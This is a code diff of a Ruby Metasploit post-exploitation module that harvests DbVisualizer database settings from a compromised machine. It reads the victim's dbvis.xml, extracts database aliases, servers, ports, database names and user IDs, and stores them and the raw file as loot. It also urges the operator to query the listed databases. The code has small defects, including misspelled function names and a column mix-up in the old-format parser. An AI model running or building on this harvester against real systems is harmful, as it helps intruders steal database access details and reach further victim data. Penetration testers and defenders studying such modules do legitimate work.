@@ -27,21 +27,9 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    db_table = Rex::Ui::Text::Table.new(
-    'Header'    => "Dbvis Databases",
-    'Indent'    => 2,
-    'Columns'   =>
-    [
-      "Alias",
-      "Type",
-      "Server",
-      "Port",
-      "Database",
-      "Namespace",
-      "Userid",
-    ])
 
-    dbs = []
+
+    oldversion= false
 
     case session.platform
     when /linux/
@@ -62,7 +50,9 @@ class Metasploit3 < Msf::Post
       dbvis_file = user_profile + "\\.dbvis\\config70\\dbvis.xml"
     end
 
+
     unless file?(dbvis_file)
+      #File not found, we next try with the old config path
       print_status("File not found: #{dbvis_file}")
       print_status("This could be an older version of dbvis, trying old path")
       case session.platform
@@ -75,12 +65,11 @@ class Metasploit3 < Msf::Post
         print_error("File not found: #{dbvis_file}")
         return
       end
+      oldversion= true
     end
-    
-    db = {}
-    print_status("Reading: #{dbvis_file}")
-    dbfound = false
 
+
+    print_status("Reading: #{dbvis_file}")   
     raw_xml = ""
     begin
       raw_xml = read_file(dbvis_file)
@@ -89,8 +78,61 @@ class Metasploit3 < Msf::Post
       print_error("Nothing read from file: #{dbvis_file}, file may be empty")
       return
     end
+    
+    if oldversion
+      # Parse old config file
+      db_table=pareseOldConfigFile(raw_xml)
+    else
+      # Parse new config file
+      db_table=pareseNewConfigFile(raw_xml)
+    end
 
-    # read config file
+    if db_table.rows.empty?
+      print_status("No database settings found")
+    else
+      print_line("\n")
+      print_line(db_table.to_s)
+      print_good("Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun !")
+      print_good("")
+      # store found databases
+      p = store_loot(
+        "dbvis.databases",
+        "text/csv",
+        session,
+        db_table.to_csv,
+        "dbvis_databases.txt",
+        "dbvis databases")
+      print_good("Databases settings stored in: #{p.to_s}")
+    end
+
+    print_status("Downloading #{dbvis_file}")
+    p = store_loot("dbvis.xml", "text/xml", session, read_file(dbvis_file), "#{dbvis_file}", "dbvis config")
+    print_good "dbvis.xml saved to #{p.to_s}"
+  end
+
+
+  # New config file parse function
+  def pareseNewConfigFile(raw_xml)
+
+    db_table = Rex::Ui::Text::Table.new(
+    'Header'    => "Dbvis Databases",
+    'Indent'    => 2,
+    'Columns'   =>
+    [
+      "Alias",
+      "Type",
+      "Server",
+      "Port",
+      "Database",
+      "Namespace",
+      "Userid",
+    ])
+    
+    dbs = []
+    db = {}
+    dbfound = false
+
+    # fetch config file
     raw_xml.each_line do |line|
       if line =~ /<Database id=/
         dbfound = true
@@ -145,7 +187,7 @@ class Metasploit3 < Msf::Post
       end
     end
 
-    # print out
+    # FIll the tab and report eligible servers
     dbs.each do |db|
       if ::Rex::Socket.is_ipv4?(db[:Server].to_s)
         print_good("Reporting #{db[:Server]} ")
@@ -154,27 +196,68 @@ class Metasploit3 < Msf::Post
 
       db_table << [ db[:Alias] , db[:Type] , db[:Server], db[:Port], db[:Database], db[:Namespace], db[:Userid]]
     end
+    return db_table
+  end
 
-    if db_table.rows.empty?
-      print_status("No database settings found")
-    else
-      print_line("\n")
-      print_line(db_table.to_s)
-      print_good("Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun !")
-      print_good("")
-      # store found databases
-      p = store_loot(
-        "dbvis.databases",
-        "text/csv",
-        session,
-        db_table.to_csv,
-        "dbvis_databases.txt",
-        "dbvis databases")
-      print_good("Databases settings stored in: #{p.to_s}")
+
+ # New config file parse function
+  def pareseOldConfigFile(raw_xml)
+
+    db_table = Rex::Ui::Text::Table.new(
+    'Header'    => "Dbvis Databases",
+    'Indent'    => 2,
+    'Columns'   =>
+    [
+      "Alias",
+      "Type",
+      "Url",
+      "Userid",
+    ])
+    
+    dbs = []
+    db = {}
+    dbfound = false
+
+    # fetch config file
+    raw_xml.each_line do |line|
+      if line =~ /<Database id=/
+        dbfound = true
+      elsif line =~ /<\/Database>/
+        dbfound=false
+        # save
+        dbs << db if (db[:Alias] and db[:Url] )
+        db = {}
+      end
+
+      if dbfound == true
+        # get the alias
+        if (line =~ /<Alias>([\S+\s+]+)<\/Alias>/i)
+          db[:Alias] = $1
+        end
+
+        # get the type
+        if (line =~ /<Type>([\S+\s+]+)<\/Type>/i)
+          db[:Type] = $1
+        end
+
+        # get the user
+        if (line =~ /<Userid>([\S+\s+]+)<\/Userid>/i)
+          db[:Userid] = $1
+        end
+
+        # get the user
+        if (line =~ /<Url>([\S+\s+]+)<\/Url>/i)
+          db[:Url] = $1
+        end
+      end
     end
 
-    print_status("Downloading #{dbvis_file}")
-    p = store_loot("dbvis.xml", "text/xml", session, read_file(dbvis_file), "#{dbvis_file}", "dbvis config")
-    print_good "dbvis.xml saved to #{p.to_s}"
+    # Fill the tab
+    dbs.each do |db|
+      db_table << [ db[:Alias] , db[:Type] , db[:Userid], db[:Url]]
+    end
+    return db_table
   end
+
+
 end
